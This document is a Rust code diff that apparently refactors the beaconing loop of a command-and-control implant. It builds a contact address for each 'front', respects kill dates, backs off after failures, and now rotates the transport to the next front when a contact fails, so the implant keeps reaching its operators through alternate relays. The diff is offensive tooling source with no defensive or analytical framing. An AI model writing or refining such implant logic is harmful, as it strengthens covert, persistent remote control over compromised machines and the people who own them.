@@ -4,7 +4,7 @@ use crate::enroll::{self, Enrollment};
 use crate::handlers::Cadence;
 use crate::profile::Profile;
 use crate::session::{Attempt, Seal, Session};
-use crate::transport::{beacon_url, carriage_for};
+use crate::transport::{carriage_for, contact_dial};
 
 /// The run's end states, mapped to process exits.
 pub enum Exit {
@@ -65,28 +65,19 @@ pub fn run(profile: &Profile) -> Exit {
         profile.kill_date.clone(),
         profile.mode != "stream",
     );
-    let mut carriage = carriage_for(profile);
 
     // Contacts never re-enroll: the artifact's identity is bound, and the
     // walk only crosses fronts. Each front on the enroll walk contributes
-    // its derived contact URL.
-    let mut walk: Vec<String> = Vec::new();
-    for url in &fronts {
-        walk.push(beacon_url(url));
-    }
+    // its contact dial; the carriage is built for the entry the walk points
+    // at, so a failed contact advances to the next front's dial and a front
+    // that returns is picked up again on the next wrap.
+    let walk: Vec<String> = fronts.iter().map(|url| contact_dial(url)).collect();
     let mut index = 0usize;
     let mut failures = 0u32;
+    let mut carriage = carriage_for(&walk[0], profile);
     loop {
         if session.kill_date_passed() || profile.kill_date_passed() {
             return Exit::Terminated(0);
-        }
-        let url = &walk[index % walk.len()];
-        if !carriage.serves(url, &profile.mode) {
-            // The walk stepped onto a URL shape this build's carriage does
-            // not dial (an mTLS front on a poll-only build, say): walk on
-            // rather than dialing something we cannot serve.
-            index += 1;
-            continue;
         }
         match carriage.attempt(&mut session) {
             Ok(Attempt::Crossed) => failures = 0,
@@ -96,8 +87,9 @@ pub fn run(profile: &Profile) -> Exit {
             }
             Err(cause) => {
                 crate::diag!("contact ended: {cause}");
-                index += 1;
                 failures += 1;
+                index = (index + 1) % walk.len();
+                carriage = carriage_for(&walk[index], profile);
             }
         }
         session.backoff_sleep(failures);
